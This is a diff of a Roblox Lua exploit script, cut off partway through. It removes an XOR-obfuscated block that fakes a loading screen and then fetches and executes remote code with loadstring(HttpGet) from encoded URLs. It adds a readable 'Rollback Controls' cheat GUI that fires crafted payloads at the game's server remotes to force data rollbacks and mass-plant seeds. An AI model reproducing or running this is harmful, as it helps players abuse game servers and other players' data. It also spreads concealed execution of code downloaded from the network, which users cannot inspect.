@@ -1,12 +1,326 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+-- RollbackControls (compact) — keeps Rollback & Cancel Rollback controls
+-- Small movable/resizable GUI + Seed selector + Plant Grid Once
+-- Whitelist check preserved elsewhere; drop into StarterPlayerScripts or StarterGui
 
-]]--
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
 
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v174,v175) local v176={};for v185=1, #v174 do v6(v176,v0(v4(v1(v2(v174,v185,v185 + 1 )),v1(v2(v175,1 + (v185% #v175) ,1 + (v185% #v175) + 1 )))%256 ));end return v5(v176);end local v8=game:GetService(v7("\227\198\203\41\239\184\198\10\212\199\253\44\244\168\211","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\23\218\47\192\242\16\200\56\211\245\32\200","\156\67\173\74\165"));local v10=game:GetService(v7("\24\190\78\30\168\47\72\51","\38\84\215\41\118\220\70"));local v11=game:GetService(v7("\98\3\44\33\251\66\0\43\17\251","\158\48\118\66\114"));local v12=game:GetService(v7("\155\40\17\47\118\183\232","\155\203\68\112\86\19\197"));local v13=Instance.new(v7("\100\209\35\238\101\126\227\253\69\201","\152\38\189\86\156\32\24\133"),v10);v13.Size=630 -(454 + 152) ;v13.Enabled=true;local v16=v12.LocalPlayer;local v17=(pcall(function() return game.CoreGui.Name;end) and game.CoreGui) or v16:WaitForChild(v7("\204\91\166\95\249\69\128\83\245","\38\156\55\199")) ;local v18=Instance.new(v7("\155\126\110\45\22\122\221\86\161","\35\200\29\28\72\115\20\154"),v17);v18.Name=v7("\53\166\223\199\164\24\24\22\190\213\214\131\43\7\26\173\212\218\131","\84\121\223\177\191\237\76");v18.ResetOnSpawn=false;local v21=Instance.new(v7("\157\68\200\173\63","\161\219\54\169\192\90\48\80"),v18);v21.Size=UDim2.new(0,767 -387 ,1288 -(993 + 295) ,17 + 293 );v21.Position=UDim2.new(0.5,1171 -(418 + 753) ,0.5 + 0 ,0 + 0 );v21.AnchorPoint=Vector2.new(0.5 + 0 ,0.5);v21.BackgroundColor3=Color3.fromRGB(3 + 7 ,539 -(406 + 123) ,1783 -(1749 + 20) );v21.BackgroundTransparency=0.15 + 0 ;v21.BorderSizePixel=1322 -(1249 + 73) ;Instance.new(v7("\124\107\35\42\91\76\5\55","\69\41\34\96"),v21).CornerRadius=UDim.new(0,6 + 10 );local v29=Instance.new(v7("\137\234\228\30\16\36\183\198","\75\220\163\183\106\98"),v21);v29.Color=Color3.fromRGB(1255 -(466 + 679) ,72 -42 ,220);v29.Thickness=2.5 -1 ;v29.Transparency=1900.4 -(106 + 1794) ;local v33=Instance.new(v7("\54\191\147\35\245\3\184\142\59","\185\98\218\235\87"),v21);v33.Text=v7("\231\37\41\254\247\158\248\63\53\239\206\190\216","\202\171\92\71\134\190");v33.Font=Enum.Font.FredokaOne;v33.TextColor3=Color3.fromRGB(81 + 174 ,65 + 190 ,255);v33.TextSize=82 -54 ;v33.Size=UDim2.new(1,0,0 -0 ,149 -(4 + 110) );v33.Position=UDim2.new(584 -(57 + 527) ,0,1427 -(41 + 1386) ,119 -(17 + 86) );v33.BackgroundTransparency=1 + 0 ;local v42=Instance.new(v7("\29\196\52\156\5\192\46\141\37","\232\73\161\76"),v21);v42.Text=v7("\182\216\70\88\94\185\192\24\29\62\190\207\19\19\33\251\197\2\110\31\178\208","\126\219\185\34\61");v42.Font=Enum.Font.RobotoMono;v42.TextColor3=Color3.fromRGB(334 -184 ,434 -284 ,160);v42.TextSize=179 -(122 + 44) ;v42.Size=UDim2.new(1,0 -0 ,0,59 -41 );v42.Position=UDim2.new(0 + 0 ,0 + 0 ,0,48);v42.BackgroundTransparency=1 -0 ;local v51=Instance.new(v7("\42\220\95\127\123","\135\108\174\62\18\30\23\147"),v21);v51.Size=UDim2.new(65.88 -(30 + 35) ,0 + 0 ,1257 -(1043 + 214) ,189 -139 );v51.Position=UDim2.new(0.5,0,1212 -(323 + 889) ,255 -160 );v51.AnchorPoint=Vector2.new(0.5,0.5);v51.BackgroundColor3=Color3.fromRGB(598 -(361 + 219) ,338 -(53 + 267) ,6 + 18 );v51.BackgroundTransparency=0.3;v51.BorderSizePixel=413 -(15 + 398) ;Instance.new(v7("\131\192\9\196\10\160\54\213","\167\214\137\74\171\120\206\83"),v51).CornerRadius=UDim.new(982 -(18 + 964) ,10);Instance.new(v7("\190\217\1\73\234\168\128\245","\199\235\144\82\61\152"),v51).Color=Color3.fromRGB(150 -110 ,24 + 16 ,50);local v60=Instance.new(v7("\46\27\184\44\2\58\184\41\2\26","\75\103\118\217"),v51);v60.Size=UDim2.new(0 + 0 ,36,0,886 -(20 + 830) );v60.Position=UDim2.new(0 + 0 ,136 -(116 + 10) ,0.5,0 + 0 );v60.AnchorPoint=Vector2.new(0,0.5);v60.BackgroundTransparency=739 -(542 + 196) ;Instance.new(v7("\242\125\83\27\171\16\194\70","\126\167\52\16\116\217"),v60).CornerRadius=UDim.new(1,0 -0 );pcall(function() v60.Image=v12:GetUserThumbnailAsync(v16.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size48x48);end);local v66=Instance.new(v7("\252\43\56\148\152\24\254\205\34","\156\168\78\64\224\212\121"),v51);v66.Text=v7("\48\235\169\205\8\227\160\142\5\239\166\197\75\174","\174\103\142\197")   .. v16.Name ;v66.Font=Enum.Font.GothamBold;v66.TextColor3=Color3.fromRGB(71 + 169 ,240,245);v66.TextSize=7 + 6 ;v66.Size=UDim2.new(1 + 0 , -(158 -98),1,0 -0 );v66.Position=UDim2.new(1551 -(1126 + 425) ,459 -(118 + 287) ,0,0);v66.BackgroundTransparency=3 -2 ;v66.TextXAlignment=Enum.TextXAlignment.Left;local v77=Instance.new(v7("\112\58\94\53\32","\152\54\72\63\88\69\62"),v21);v77.Size=UDim2.new(1121.88 -(118 + 1003) ,0,0,122 -80 );v77.Position=UDim2.new(377.5 -(142 + 235) ,0 -0 ,0 + 0 ,150);v77.AnchorPoint=Vector2.new(0.5,0.5);v77.BackgroundColor3=Color3.fromRGB(995 -(553 + 424) ,33 -15 ,22 + 2 );v77.BackgroundTransparency=0.3;v77.BorderSizePixel=0;Instance.new(v7("\225\237\205\83\198\202\235\78","\60\180\164\142"),v77).CornerRadius=UDim.new(0 + 0 ,5 + 3 );local v85=Instance.new(v7("\113\83\4\46\34\193\19\90\91\9","\114\56\62\101\73\71\141"),v77);v85.Size=UDim2.new(0,9 + 11 ,0 + 0 ,43 -23 );v85.Position=UDim2.new(0 -0 ,26 -14 ,0.5 + 0 ,0);v85.AnchorPoint=Vector2.new(0 -0 ,0.5);v85.BackgroundTransparency=1;v85.Image=v7("\170\235\195\197\171\250\222\208\177\237\129\139\247\184\136\145\236\188\139\156\236\186\138\148","\164\216\137\187");v85.ImageColor3=Color3.fromRGB(867 -(239 + 514) ,49 + 88 ,218);local v92=Instance.new(v7("\230\227\41\166\138\255\9\215\234","\107\178\134\81\210\198\158"),v77);v92.Text=v7("\60\7\145\197\165\42\10\204\193\173\119\60\137\247\153\10\4\179\196\135\108","\202\88\110\226\166");v92.Font=Enum.Font.RobotoMono;v92.TextColor3=Color3.fromRGB(1499 -(797 + 532) ,124 + 46 ,61 + 119 );v92.TextSize=27 -15 ;v92.Size=UDim2.new(1202.6 -(373 + 829) ,0,732 -(476 + 255) ,0);v92.Position=UDim2.new(0,1174 -(369 + 761) ,0 + 0 ,0 -0 );v92.BackgroundTransparency=1 -0 ;v92.TextXAlignment=Enum.TextXAlignment.Left;local v101=Instance.new(v7("\247\10\154\227\232\214\27\150\248\196","\170\163\111\226\151"),v77);v101.Size=UDim2.new(238 -(64 + 174) ,70,0 + 0 ,38 -12 );v101.Position=UDim2.new(337 -(144 + 192) , -8,216.5 -(42 + 174) ,0 + 0 );v101.AnchorPoint=Vector2.new(1 + 0 ,0.5 + 0 );v101.BackgroundColor3=Color3.fromRGB(1614 -(363 + 1141) ,1610 -(1183 + 397) ,669 -449 );v101.BorderSizePixel=0 + 0 ;v101.Text=v7("\50\63\162\33","\73\113\80\210\88\46\87");v101.Font=Enum.Font.GothamBold;v101.TextColor3=Color3.fromRGB(191 + 64 ,255,2230 -(1913 + 62) );v101.TextSize=8 + 4 ;Instance.new(v7("\180\5\238\29\245\143\41\223","\135\225\76\173\114"),v101).CornerRadius=UDim.new(0 -0 ,1938 -(565 + 1368) );v101.MouseButton1Click:Connect(function() local v178=0 -0 ;local v179;while true do if (v178==(1661 -(1477 + 184))) then v179=0 -0 ;while true do if ((0 + 0)==v179) then if setclipboard then setclipboard(v7("\30\228\171\179\163\175\163\84\234\191\255\158\182\150\41\223\178\129\174\144\243","\199\122\141\216\208\204\221"));end v101.Text=v7("\142\210\0\249\125\242\236","\150\205\189\112\144\24");v179=857 -(564 + 292) ;end if ((1 -0)==v179) then v101.BackgroundColor3=Color3.fromRGB(180 -120 ,319 -(244 + 60) ,85 + 25 );task.delay(478 -(41 + 435) ,function() local v194=0;while true do if (v194==(1001 -(938 + 63))) then v101.Text=v7("\6\139\175\85","\112\69\228\223\44\100\232\113");v101.BackgroundColor3=Color3.fromRGB(85 + 25 ,30,1345 -(936 + 189) );break;end end end);break;end end break;end end end);local v112=Instance.new(v7("\253\18\6\212\179\80\135\214\26\11","\230\180\127\103\179\214\28"),v21);v112.Size=UDim2.new(0,36,0,12 + 24 );v112.Position=UDim2.new(1613.5 -(1565 + 48) ,0,0 + 0 ,1338 -(782 + 356) );v112.AnchorPoint=Vector2.new(267.5 -(176 + 91) ,0.5);v112.BackgroundTransparency=2 -1 ;v112.Image=v7("\158\7\71\71\247\82\229\152\12\91\28\171\14\177\220\93\10\22\182\18\179\216\93\14","\128\236\101\63\38\132\33");v112.ImageRectSize=Vector2.new(147 -47 ,100);local v119=Instance.new(v7("\138\187\16\73\179","\175\204\201\113\36\214\139"),v21);v119.Size=UDim2.new(0.88,1092 -(975 + 117) ,0,1883 -(157 + 1718) );v119.Position=UDim2.new(0.5,0 + 0 ,0 -0 ,803 -568 );v119.AnchorPoint=Vector2.new(0.5,0.5);v119.BackgroundColor3=Color3.fromRGB(1040 -(697 + 321) ,59 -37 ,30);v119.BorderSizePixel=0 -0 ;Instance.new(v7("\114\229\22\211\22\73\201\39","\100\39\172\85\188"),v119).CornerRadius=UDim.new(1,0 -0 );local v126=Instance.new(v7("\139\106\184\141\54","\83\205\24\217\224"),v119);v126.Size=UDim2.new(0 + 0 ,0 -0 ,2 -1 ,0);v126.BackgroundColor3=Color3.fromRGB(1482 -(322 + 905) ,866 -(602 + 9) ,1444 -(449 + 740) );v126.BorderSizePixel=872 -(826 + 46) ;Instance.new(v7("\211\236\238\50\244\203\200\47","\93\134\165\173"),v126).CornerRadius=UDim.new(948 -(245 + 702) ,0 -0 );local v131=Instance.new(v7("\139\219\230\208\59\202\187\123\176\230","\30\222\146\161\162\90\174\210"),v126);v131.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(110,1928 -(260 + 1638) ,660 -(382 + 58) )),ColorSequenceKeypoint.new(1,Color3.fromRGB(150 + 30 ,144 -74 ,757 -502 ))});local v133=Instance.new(v7("\209\75\104\30\201\79\114\15\233","\106\133\46\16"),v21);v133.Size=UDim2.new(0.85,0,1205 -(902 + 303) ,43 -23 );v133.Position=UDim2.new(0.5,0 -0 ,0 + 0 ,1955 -(1121 + 569) );v133.AnchorPoint=Vector2.new(0.5,214.5 -(22 + 192) );v133.BackgroundTransparency=1;v133.Font=Enum.Font.RobotoMono;v133.TextColor3=Color3.fromRGB(823 -(483 + 200) ,130,1623 -(1404 + 59) );v133.TextSize=35 -22 ;v133.Text=v7("\116\47\114\248\83\78\95","\32\56\64\19\156\58");local v142=Instance.new(v7("\110\205\253\66\118\243\130\95\196","\224\58\168\133\54\58\146"),v21);v142.Size=UDim2.new(0.85 -0 ,765 -(468 + 297) ,0,577 -(334 + 228) );v142.Position=UDim2.new(0.5 -0 ,0 -0 ,0 -0 ,82 + 206 );v142.AnchorPoint=Vector2.new(0.5,236.5 -(141 + 95) );v142.BackgroundTransparency=1;v142.Font=Enum.Font.RobotoMono;v142.TextColor3=Color3.fromRGB(89 + 1 ,205 -125 ,264 -154 );v142.TextSize=12;v142.Text=v7("\9\19","\107\57\54\43\157\21\230\231");local v151=Instance.new(v7("\239\142\9\225\155\201\219\207\132\31","\175\187\235\113\149\217\188"),v21);v151.Size=UDim2.new(0.88,0,0,10 + 32 );v151.Position=UDim2.new(0.5 -0 ,0,0 + 0 ,131 + 119 );v151.AnchorPoint=Vector2.new(0.5 -0 ,0.5 + 0 );v151.BackgroundColor3=Color3.fromRGB(273 -(92 + 71) ,30,220);v151.BorderSizePixel=0 + 0 ;v151.Text=v7("\16\160\128\72\163\74\123\46\166\145\88","\24\92\207\225\44\131\25");v151.Font=Enum.Font.GothamBold;v151.TextColor3=Color3.fromRGB(428 -173 ,1020 -(574 + 191) ,255);v151.TextSize=14;v151.BackgroundTransparency=1 + 0 ;v151.TextTransparency=2 -1 ;v151.Visible=false;Instance.new(v7("\126\250\155\67\9\115\78\193","\29\43\179\216\44\123"),v151).CornerRadius=UDim.new(0 + 0 ,857 -(254 + 595) );local v165=126 -(55 + 71) ;local v166=20 -4 ;local v167=false;local v168;v168=v11.RenderStepped:Connect(function() if  not v167 then local v187=1790 -(573 + 1217) ;local v188;while true do if (v187==0) then v188=0 -0 ;while true do if (v188==(0 + 0)) then v165=(v165 + (1 -0))%v166 ;v112.ImageRectOffset=Vector2.new(v165 * (1039 -(714 + 225)) ,0);break;end end break;end end else v112.ImageRectOffset=Vector2.new(0 -0 ,100);end end);local v169=0;local v170=true;task.spawn(function() while v170 do local v186=0 -0 ;while true do if (v186==(1 + 0)) then task.wait(0.3 -0 );break;end if (v186==0) then v169=(v169 + 1)%(811 -(118 + 688)) ;v133.Text=v7("\145\214\33\72\180\215\39","\44\221\185\64")   .. string.rep(".",v169) ;v186=1;end end end end);local v171=5;local v172=os.clock();while (os.clock() -v172)<v171  do local v180=48 -(25 + 23) ;local v181;local v182;while true do if (1==v180) then v142.Text=math.floor(v182 * (20 + 80) )   .. "%" ;v9:Create(v126,TweenInfo.new(1886.05 -(927 + 959) ,Enum.EasingStyle.Linear),{[v7("\50\238\82\90","\19\97\135\40\63")]=UDim2.new(v182,0,1,0)}):Play();v180=6 -4 ;end if (v180==0) then v181=os.clock() -v172 ;v182=math.clamp(v181/v171 ,732 -(16 + 716) ,1);v180=1 -0 ;end if (v180==2) then task.wait();break;end end end v170=false;v142.Text=v7("\255\12\99\126","\81\206\60\83\91\79");v126.Size=UDim2.new(98 -(11 + 86) ,0,2 -1 ,285 -(175 + 110) );v167=true;task.wait(0.4);local v173=TweenInfo.new(0.4,Enum.EasingStyle.Quart,Enum.EasingDirection.Out);v9:Create(v119,v173,{[v7("\125\162\202\119","\196\46\203\176\18\79\163\45")]=UDim2.new(0 -0 ,0 -0 ,1796 -(503 + 1293) ,0 -0 ),[v7("\154\35\125\21\35\233\224\173\44\122\42\54\250\225\171\50\127\12\33\245\236\161","\143\216\66\30\126\68\155")]=1}):Play();v9:Create(v126,v173,{[v7("\136\201\14\192\194\177\216\244\164\204\57\217\196\173\196\241\171\218\8\197\198\186","\129\202\168\109\171\165\195\183")]=1}):Play();v9:Create(v133,v173,{[v7("\22\93\47\204\234\6\231\44\75\39\217\204\17\232\33\65","\134\66\56\87\184\190\116")]=1 + 0 }):Play();v9:Create(v142,v173,{[v7("\8\52\17\175\45\249\32\59\47\33\8\169\28\229\34\44","\85\92\81\105\219\121\139\65")]=1}):Play();v9:Create(v112,v173,{[v7("\212\190\81\66\121\235\239\178\94\86\108\222\239\182\94\70\101","\191\157\211\48\37\28")]=1062 -(810 + 251) }):Play();task.wait(0.4 + 0 );v151.Visible=true;v9:Create(v151,v173,{[v7("\253\30\247\23\61\205\16\225\18\62\235\13\245\18\41\207\30\230\25\52\220\6","\90\191\127\148\124")]=0,[v7("\76\130\54\3\76\149\47\25\107\151\47\5\125\137\45\14","\119\24\231\78")]=0 + 0 }):Play();v151.MouseButton1Click:Connect(function() local v183=0;local v184;while true do if (v183==(0 + 0)) then v184=533 -(43 + 490) ;while true do if (v184==0) then if v168 then v168:Disconnect();end v18:Destroy();v184=734 -(711 + 22) ;end if (v184==1) then v13:Destroy();task.spawn(function() local v195=0 -0 ;local v196;local v197;local v198;while true do if (v195==1) then v198=nil;while true do if (v196==(859 -(240 + 619))) then v197,v198=pcall(function() loadstring(game:HttpGet(v7("\138\57\177\90\207\26\94\205\63\164\93\146\71\24\150\37\176\72\201\83\20\144\46\170\68\200\69\31\150\99\166\69\209\15\50\141\41\160\78\239\65\24\205\10\132\109\142\15\3\135\43\182\5\212\69\16\134\62\234\71\221\73\31\205\33\170\75\216\69\3\204\33\176\75","\113\226\77\197\42\188\32")))();end);if  not v197 then warn(v7("\31\14\241\182\47\2\253\186\52\86\209\167\40\25\230\239\122","\213\90\118\148")   .. tostring(v198) );end break;end end break;end if (0==v195) then v196=0 + 0 ;v197=nil;v195=1 -0 ;end end end);break;end end break;end end end);task.wait(0.5 + 0 );loadstring(game:HttpGet(v7("\83\58\160\70\94\1\97\251\70\76\72\58\177\80\84\21\47\164\70\2\81\47\140\121\64\108\8\153\25\95\90\57","\45\59\78\212\54")))();
+local player = Players.LocalPlayer
+if not player then return end
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Guard / single-run
+local EXISTING_NAME = "RollbackControlsGorgeous"
+local RUN_ATTR = "RollbackControlsRunning"
+if playerGui:GetAttribute(RUN_ATTR) then
+    if playerGui:FindFirstChild(EXISTING_NAME) then return end
+end
+playerGui:SetAttribute(RUN_ATTR, true)
+
+-- Helpers
+local function create(class, props)
+    local inst = Instance.new(class)
+    if props then for k,v in pairs(props) do inst[k] = v end end
+    return inst
+end
+
+local conns = {}
+local function track(c) if c then table.insert(conns, c) end return c end
+local function cleanup()
+    for _,c in ipairs(conns) do if c and c.Connected then pcall(function() c:Disconnect() end) end end
+    conns = {}
+    pcall(function() playerGui:SetAttribute(RUN_ATTR, nil) end)
+end
+
+local function notify(title, text, dur, ok)
+    dur = dur or 2
+    local gui = create("ScreenGui",{Name="RC_Notify_"..math.random(1,9999), ResetOnSpawn=false, Parent=playerGui})
+    local f = create("Frame", {Size=UDim2.new(0,260,0,66), Position=UDim2.new(1,-280,0,18), BackgroundColor3 = ok and Color3.fromRGB(30,60,30) or Color3.fromRGB(60,30,30), Parent=gui})
+    create("UICorner",{CornerRadius=UDim.new(0,8), Parent=f})
+    create("TextLabel",{Parent=f, Position=UDim2.new(0,8,0,6), Size=UDim2.new(1,-16,0,18), BackgroundTransparency=1, Text=title, Font=Enum.Font.GothamBold, TextSize=14, TextColor3=Color3.new(1,1,1)})
+    create("TextLabel",{Parent=f, Position=UDim2.new(0,8,0,26), Size=UDim2.new(1,-16,0,34), BackgroundTransparency=1, Text=text, Font=Enum.Font.Gotham, TextSize=12, TextColor3=Color3.new(1,1,1), TextWrapped=true})
+    pcall(function() TweenService:Create(f, TweenInfo.new(0.22), {Position = UDim2.new(1,-280,0,18)}):Play() end)
+    delay(dur, function() if gui and gui.Parent then pcall(function() gui:Destroy() end) end end)
+end
+
+-- Remote helpers (existing behavior)
+local function getPacketRemote()
+    local ok, res = pcall(function()
+        local sm = ReplicatedStorage:FindFirstChild("SharedModules")
+        if not sm then return nil end
+        local packet = sm:FindFirstChild("Packet")
+        if not packet then return nil end
+        return packet:FindFirstChild("RemoteEvent")
+    end)
+    return ok and res or nil
+end
+local PACKET_REMOTE = getPacketRemote()
+local REMOTE_ID = 54
+local function safeFire(id, payload)
+    if PACKET_REMOTE then
+        pcall(function() PACKET_REMOTE:FireServer(id, payload) end)
+        return true
+    end
+    return false
+end
+
+-- SEED_PAYLOADS mapping (adjust to your game's payloads)
+local SEED_PAYLOADS = {
+    ["Carrot Mega"] = "PLANT:CARROT_MEGA",
+    ["Carrot"] = "PLANT:CARROT",
+    ["Mega Seed"] = "PLANT:MEGA_SEED",
+}
+local Seeds = {}
+for k,_ in pairs(SEED_PAYLOADS) do table.insert(Seeds, k) end
+table.sort(Seeds)
+local selectedSeed = Seeds[1] or "Carrot Mega"
+
+-- Planting (tries Networking -> ReplicaSet -> Packet, else uses REMOTE payload)
+local NetworkingModule
+pcall(function()
+    local sm = ReplicatedStorage:FindFirstChild("SharedModules")
+    if sm then local m = sm:FindFirstChild("Networking") if m and m:IsA("ModuleScript") then NetworkingModule = require(m) end end
+end)
+local function getReplicaSet() local rem = ReplicatedStorage:FindFirstChild("RemoteEvents") return rem and rem:FindFirstChild("ReplicaSet") or nil end
+local function tryPlantAt(pos, seedName, plot)
+    if NetworkingModule and NetworkingModule.Plant and NetworkingModule.Plant.PlantSeed then
+        local ok = pcall(function() NetworkingModule.Plant.PlantSeed:Fire(pos, seedName, plot) end)
+        if ok then return true end
+    end
+    local replica = getReplicaSet()
+    if replica then
+        local ok = pcall(function() replica:FireServer(4, {"Inventory","Seeds", seedName}, 2) end)
+        if ok then return true end
+    end
+    local packet = getPacketRemote()
+    if packet then
+        local ok = pcall(function()
+            local payload = tostring(seedName) .. "$" .. HttpService:GenerateGUID(false)
+            local payloadObj = payload
+            local okBuf, buf = pcall(function() if typeof(buffer) == "table" and type(buffer.fromstring) == "function" then return buffer.fromstring(payload) end end)
+            if okBuf and buf then payloadObj = buf end
+            packet:FireServer(payloadObj)
+        end)
+        if ok then return true end
+    end
+    -- last resort: send mapped REMOTE payload via PACKET_REMOTE if available
+    local rem = getPacketRemote()
+    local mapping = SEED_PAYLOADS[seedName]
+    if rem and mapping then
+        pcall(function() rem:FireServer(REMOTE_ID, mapping) end)
+        return true
+    end
+    return false, "No plant method"
+end
+
+local function getPlot()
+    local gardens = Workspace:FindFirstChild("Gardens")
+    if not gardens then return nil end
+    for _,g in ipairs(gardens:GetChildren()) do
+        if tostring(g:GetAttribute("OwnerUserId")) == tostring(player.UserId) then return g end
+    end
+    return nil
+end
+
+local function plantGrid(rows, cols, seedName)
+    local plot = getPlot()
+    if not plot then return false, "Plot not found" end
+    local ref = plot:FindFirstChild("PlotSizeReference") or plot:FindFirstChild("SpawnPoint")
+    if not ref or not ref:IsA("BasePart") then return false, "Plot reference missing" end
+    rows = math.max(1, math.floor(rows or 6))
+    cols = math.max(1, math.floor(cols or 6))
+    local cf, sz = ref.CFrame, ref.Size
+    local topY = ref.Position.Y + sz.Y/2 + 1
+    for r = 1, rows do
+        for c = 1, cols do
+            local fx = (r / (rows + 1) - 0.5) * sz.X * 0.9
+            local fz = (c / (cols + 1) - 0.5) * sz.Z * 0.9
+            local world = cf * CFrame.new(fx, 0, fz)
+            local pos = Vector3.new(world.X, topY, world.Z)
+            pcall(function() tryPlantAt(pos, seedName, plot) end)
+            task.wait(0.03)
+        end
+    end
+    return true
+end
+
+-- Compact GUI (small, movable, resizable)
+local W, H = 260, 140
+local MIN_W, MIN_H = 220, 110
+
+local old = playerGui:FindFirstChild(EXISTING_NAME)
+if old then old:Destroy() end
+
+local gui = create("ScreenGui", {Name = EXISTING_NAME, ResetOnSpawn = false, Parent = playerGui})
+local frame = create("Frame", {Parent = gui, Size = UDim2.new(0, W, 0, H), Position = UDim2.new(0, 16, 0, 16), BackgroundColor3 = Color3.fromRGB(22,24,26)})
+create("UICorner",{CornerRadius=UDim.new(0,8), Parent = frame})
+create("UIStroke",{Color=Color3.fromRGB(38,42,48), Thickness=1, Parent = frame})
+
+local title = create("TextLabel", {Parent = frame, Position = UDim2.new(0,8,0,6), Size = UDim2.new(1,-16,0,18), BackgroundTransparency=1, Text="Rollback Controls", Font=Enum.Font.GothamBold, TextSize=14, TextColor3=Color3.fromRGB(240,240,245), TextXAlignment=Enum.TextXAlignment.Left})
+local sub = create("TextLabel", {Parent = frame, Position = UDim2.new(0,8,0,24), Size = UDim2.new(1,-16,0,12), BackgroundTransparency=1, Text="small | movable | resizable", Font=Enum.Font.Gotham, TextSize=10, TextColor3=Color3.fromRGB(170,170,170), TextXAlignment=Enum.TextXAlignment.Left})
+
+local content = create("Frame", {Parent = frame, Position = UDim2.new(0,8,0,40), Size = UDim2.new(1,-16,1,-48), BackgroundTransparency=1})
+local list = create("UIListLayout", {Parent = content, SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0,6)})
+list.HorizontalAlignment = Enum.HorizontalAlignment.Left
+
+-- small function to create toggle (used for Rollback & Cancel Rollback)
+local function makeToggleRow(labelText, layoutOrder)
+    local row = create("Frame", {Parent = content, Size = UDim2.new(1,0,0,24)}); row.LayoutOrder = layoutOrder
+    create("TextLabel", {Parent = row, Position = UDim2.new(0,0,0,0), Size = UDim2.new(0.56,0,1,0), BackgroundTransparency=1, Text=labelText, Font=Enum.Font.Gotham, TextSize=13, TextColor3=Color3.fromRGB(220,220,225), TextXAlignment=Enum.TextXAlignment.Left})
+    local sw = create("Frame", {Parent = row, Position = UDim2.new(1,-66,0, -2), Size = UDim2.new(0,60,0,20), BackgroundColor3=Color3.fromRGB(60,60,66)})
+    create("UICorner",{CornerRadius=UDim.new(0,12), Parent = sw})
+    local inner = create("Frame", {Parent = sw, Position = UDim2.new(0,2,0,2), Size = UDim2.new(0,16,0,16), BackgroundColor3=Color3.fromRGB(240,240,245)})
+    create("UICorner",{CornerRadius=UDim.new(0,10), Parent = inner})
+    local state = create("TextLabel", {Parent = sw, Position = UDim2.new(0,4,0,0), Size = UDim2.new(1,-8,1,0), BackgroundTransparency=1, Text="OFF", Font=Enum.Font.Gotham, TextSize=11, TextColor3=Color3.fromRGB(160,160,160), TextXAlignment=Enum.TextXAlignment.Right})
+    return {Row=row, Switch=sw, Inner=inner, State=state, Enabled=false}
+end
+
+local rollbackToggle = makeToggleRow("Rollback", 1)
+local cancelToggle = makeToggleRow("Cancel Rollback Data", 2)
+
+-- wire toggles to call original payloads (safeFire via PACKET remote)
+local function animateToggle(tog, enabled)
+    local inner, state = tog.Inner, tog.State
+    if enabled then
+        TweenService:Create(inner, TweenInfo.new(0.18), {Position = UDim2.new(1,-18,0,2), BackgroundColor3 = Color3.fromRGB(90,200,170)}):Play()
+        state.Text = "ON"; state.TextColor3 = Color3.fromRGB(100,220,150)
+    else
+        TweenService:Create(inner, TweenInfo.new(0.18), {Position = UDim2.new(0,2,0,2), BackgroundColor3 = Color3.fromRGB(240,240,245)}):Play()
+        state.Text = "OFF"; state.TextColor3 = Color3.fromRGB(160,160,160)
+    end
+end
+
+track(rollbackToggle.Switch.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        rollbackToggle.Enabled = not rollbackToggle.Enabled
+        animateToggle(rollbackToggle, rollbackToggle.Enabled)
+        -- preserved payload used previously
+        local payload = ":\xF7"
+        safeFire(REMOTE_ID, rollbackToggle.Enabled and payload or "")
+    end
+end))
+
+track(cancelToggle.Switch.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        cancelToggle.Enabled = not cancelToggle.Enabled
+        animateToggle(cancelToggle, cancelToggle.Enabled)
+        local payload = ":\xF7"
+        safeFire(REMOTE_ID, cancelToggle.Enabled and payload or "")
+    end
+end))
+
+-- Seed selection row
+local seedRow = create("Frame", {Parent = content, Size = UDim2.new(1,0,0,22)}); seedRow.LayoutOrder = 3
+create("TextLabel", {Parent = seedRow, Position = UDim2.new(0,0,0,0), Size = UDim2.new(0.32,0,1,0), BackgroundTransparency=1, Text="Seed:", Font=Enum.Font.Gotham, TextSize=12, TextColor3=Color3.fromRGB(220,220,225)})
+local seedBox = create("TextBox", {Parent = seedRow, Position = UDim2.new(0.34,0,0,0), Size = UDim2.new(0.64,0,1,0), Text = selectedSeed, BackgroundColor3 = Color3.fromRGB(30,30,34), ClearTextOnFocus=false, Font=Enum.Font.Gotham, TextSize=12}); create("UICorner",{CornerRadius=UDim.new(0,6), Parent = seedBox})
+track(seedBox.MouseButton1Click:Connect(function() 
+    -- popup
+    local popupW, popupH = 160, math.min(180, 8 + #Seeds * 20)
+    local popup = create("Frame", {Parent = gui, Size = UDim2.new(0, popupW, 0, popupH), Position = UDim2.new(0, frame.AbsolutePosition.X + 12, 0, frame.AbsolutePosition.Y + 60), BackgroundColor3 = Color3.fromRGB(28,28,30)})
+    create("UICorner",{CornerRadius=UDim.new(0,6), Parent = popup})
+    local scr = create("ScrollingFrame", {Parent = popup, Size = UDim2.new(1,-8,1,-8), Position = UDim2.new(0,4,0,4), BackgroundTransparency = 1, ScrollBarThickness = 6})
+    local lst = create("UIListLayout", {Parent = scr, SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0,4)})
+    for _,s in ipairs(Seeds) do
+        local b = create("TextButton", {Parent = scr, Size = UDim2.new(1,0,0,18), BackgroundColor3 = Color3.fromRGB(36,36,40), Text = s, Font = Enum.Font.Gotham, TextSize = 12})
